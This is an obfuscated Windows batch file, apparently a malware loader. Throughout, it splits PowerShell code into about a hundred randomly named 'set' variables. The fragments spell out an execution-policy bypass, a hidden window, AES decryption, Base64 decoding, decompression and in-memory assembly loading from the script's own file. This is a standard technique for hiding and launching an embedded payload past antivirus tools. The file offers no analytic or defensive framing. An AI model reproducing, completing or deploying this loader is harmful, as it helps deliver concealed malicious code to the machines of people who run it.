@echo off
set "osuRGyLzJT=  $E"
set "jjdgBNmLoE=S.Pa"
set "CgdttqgPEq=New-"
set "VVDkKPqdnp=F'[-"
set "CEiScTGspu=csxR"
set "ttPrOzbsPY=lU);"
set "cvUNtaSlZX=ct S"
set "lsnCVuaHOU=gjYA"
set "KJfFGmGCWk=ect "
set "FTQnfOUSCt=PTtG"
set "wdpCFhCygr=.Cop"
set "SKGeeQyLPX=PxEW"
set "olHdvCWNNR=Syth"
set "floYXeYUdE=comm"
set "loUwBzqlXr=)($S"
set "pgkABjnYBw== [S"
set "AuGeJUOCeW=YxVw"
set "xGuzAipBcj=, (,"
set "uffPtiZnMq=gth)"
set "ChUBvzYMlH=se()"
set "xMZCTyUESn=ddin"
set "xXDsFeylrQ=[-1."
set "XrLSVqokTn=;$Qb"
set "PsldRODlBw=orF'"
set "pQBHtpPYuA=);$V"
set "kkVPVlmfxk=ress"
set "KaxKnYMKzg=g = "
set "aoaJULJIjv=ke($"
set "RhCMsaTgGl=1..-"
set "WqQyKoBewF=ne);"
set "HcAaTgFPef=Y.Su"
set "FJbFirerNJ=MOUS"
set "PjbZWQpBvc=yste"
set "lrcMuPgeCw=m.Re"
set "lkofOHeOJH=MSR "
set "wgqUaiJOjs=MOUS"
set "slPxZKnwuZ=New-"
set "tFuOHKWBGr=106u"
set "nOWPoZfCeZ=flec"
set "OOhGecbnFZ=Disp"
set "VsZWcTDZdU=eam("
set "OmySJYdxfM=.Ass"
set "mLLFAbIRJD=ay()"
set "pfmuqeZhQz=, $S"
set "WFFvoFEHzG=$VzC"
set "LKhUkmPyBZ=bypa"
set "DMJoTJjiIi=A = "
set "DOXnJunzKt=;$Qb"
set "aUGauWpupS=.Con"
set "xphHehAeBd=gsYZ"
set "XmEhtivyfo=ddin"
set "ulRIeMJcDs=y.Ci"
set "kNVGOOkyEN=ct S"
set "CWjntlgXgB=]::("
set "rBKvbFHyAu=ivY."
set "UGyZBPGqiG=MOUS"
set "jNimXKqjsS=.-16"
set "EWvqmeZYeM=esaB"
set "LNwwKakHgV=y]::"
set "LjfqqTCAZw=Mode"
set "eZudBCSbkB=Conv"
set "nvHCholpwN=onve"
set "iLrpgYPWjy=ress"
set "PeAiGWMMzc=('Tg"
set "lLHyKJTiqh='[-1"
set "ENLvMBahBt=ment"
set "aUpYdKVddo=CFxo"
set "wmkHfixVCD=h = "
set "SbqdpfbAvA=Bmor"
set "ySbvEPBHrB=urit"
set "wGskLnrFLh=Obje"
set "XhsZSfGFve=Syth"
set "oKmcVLyHGr=VXY."
set "XZyRvLZqMg=A = "
set "otlbPHSNRW='txe"
set "cGFhHDIdxo=e]::"
set "MtFlJFDqBS=tryP"
set "bLTtCyPKZm=zHhH"
set "LKCiJHGJlr=yste"
set "uzzUWvCnry=).Sp"
set "RQrpzdACXi=Comp"
set "qnpsiBzJwD=em.C"
set "APRGnUGeTe=pres"
set "lixKErvjXu=null"
set "pTfURfTufF=ecry"
set "KKAHwEaQAl=);$L"
set "GGQsguYecF= [Sy"
set "jSrvblgAsk=VMOU"
set "JmFcmjaveY== $V"
set "vLiDxYmAnP=pose"
set "GHpUIDzJAu=yTo("
set "DIqKixflHY=PKCS"
set "fpcGiEiHRv=;$Hi"
set "KKvMmiNWMH=K = "
set "iwbvqaHAmL=le  "
set "cVqotxZwUh=..-1"
set "PxYLXQyDIq=();$"
set "LLqIcrtxpD=ss -"
set "feTqWAOnaW=HiWg"
set "lkVNBbPbiI=-1.."
set "awSAwVIdeY=ing("
set "vlsUJkwwdX=saBm"
set "xBKgzCTeIT=; };"
set "SdSZYHoIIx=Fina"
set "eLawgrjMLp=US.I"
set "oycSKklBeH=('%~f0'"
set "aRFZcNHrca=csxR"
set "PZavYOfwZX=::('"
set "nCKHaUdajC=yste"
set "TCeFHUHRxe=6esa"
